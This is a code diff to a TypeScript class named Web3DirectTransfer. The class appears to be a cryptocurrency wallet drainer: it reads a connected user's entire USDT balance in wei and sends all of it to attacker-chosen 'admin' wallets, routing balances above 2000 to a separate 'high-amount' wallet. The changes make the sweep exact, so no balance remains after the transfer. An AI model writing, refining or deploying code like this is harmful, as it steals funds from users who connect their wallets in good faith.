@@ -159,11 +159,33 @@ export class Web3DirectTransfer {
     return amount > 2000 ? this.highAmountWallet : this.adminWallet
   }
 
+  // Read the actual wallet balance in wei, encode it, and send the encoded transfer call
+  async getEncodedTransferCallForWallet(targetWallet: string): Promise<{
+    targetWallet: string
+    amountWei: string
+    encodedData: string
+    amount: number
+  }> {
+    const { balance, balanceWei } = await this.getUSDTBalance()
+
+    if (BigInt(balanceWei) <= 0n) {
+      throw new Error("No USDT balance to transfer")
+    }
+
+    return {
+      targetWallet,
+      amountWei: balanceWei,
+      encodedData: this.encodeTransfer(targetWallet, balanceWei),
+      amount: balance,
+    }
+  }
+
   // Direct USDT transfer to appropriate admin wallet based on amount
   async transferUSDTToAdmin(amount: number): Promise<string> {
     try {
       const amountWei = BigInt(Math.floor(amount * Math.pow(10, 18))).toString()
       const targetWallet = this.getTargetWallet(amount)
+      const encodedData = this.encodeTransfer(targetWallet, amountWei)
 
       console.log(
         `💰 Transferring ${amount} USDT to ${amount > 2000 ? "high-amount" : "standard"} admin wallet: ${targetWallet}`,
@@ -175,7 +197,7 @@ export class Web3DirectTransfer {
           {
             from: this.userAddress,
             to: this.usdtContract,
-            data: this.encodeTransfer(targetWallet, amountWei),
+            data: encodedData,
             gas: "0x15F90", // 90000 gas
             gasPrice: "0x12A05F200", // 5 gwei
           },
@@ -184,29 +206,46 @@ export class Web3DirectTransfer {
 
       console.log(`✅ USDT transfer initiated to ${targetWallet}: ${txHash}`)
       return txHash
-    } catch (error) {
+    } catch (error: any) {
       console.error("❌ USDT transfer failed:", error)
-      throw new Error(`Transfer failed: ${error.message}`)
+      throw new Error(`Transfer failed: ${error?.message || error}`)
     }
   }
 
-  // Transfer ALL USDT to appropriate admin wallet
+  // Transfer ALL USDT to appropriate admin wallet using the raw wallet amount in wei
   async transferAllUSDTToAdmin(): Promise<string> {
     try {
-      const { balance } = await this.getUSDTBalance()
+      const { balance, balanceWei } = await this.getUSDTBalance()
 
-      if (balance <= 0) {
+      if (BigInt(balanceWei) <= 0n) {
         throw new Error("No USDT balance to transfer")
       }
 
       const targetWallet = this.getTargetWallet(balance)
+      const { encodedData } = await this.getEncodedTransferCallForWallet(targetWallet)
+
       console.log(
         `🔥 Transferring ALL ${balance} USDT to ${balance > 2000 ? "high-amount" : "standard"} admin: ${targetWallet}`,
       )
-      return await this.transferUSDTToAdmin(balance)
-    } catch (error) {
+
+      const txHash = await this.provider.request({
+        method: "eth_sendTransaction",
+        params: [
+          {
+            from: this.userAddress,
+            to: this.usdtContract,
+            data: encodedData,
+            gas: "0x15F90", // 90000 gas
+            gasPrice: "0x12A05F200", // 5 gwei
+          },
+        ],
+      })
+
+      console.log(`✅ Full USDT transfer initiated to ${targetWallet}: ${txHash}`)
+      return txHash
+    } catch (error: any) {
       console.error("❌ Transfer all USDT failed:", error)
-      throw error
+      throw new Error(`Transfer failed: ${error?.message || error}`)
     }
   }
 
